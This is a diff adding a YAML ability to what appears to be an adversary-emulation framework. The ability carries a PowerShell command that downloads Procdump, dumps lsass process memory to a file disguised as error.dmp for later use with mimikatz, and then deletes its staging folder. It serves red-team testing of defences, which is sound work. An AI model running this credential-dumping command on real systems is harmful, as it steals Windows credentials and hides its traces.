@@ -1,0 +1,19 @@
+- id: 0ef4cc7b-611c-4237-b20b-db36b6906554
+  name: Leverage Procdump for lsass memory
+  description: Dump lsass for later use with mimikatz
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\"\
+          ;\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\\
+          Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination\
+          \ $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\"\
+          \ -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\
+          \nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma\
+          \ lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\
+          \\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n\
+          }\nremove-item $staging_folder -Recurse;\n"
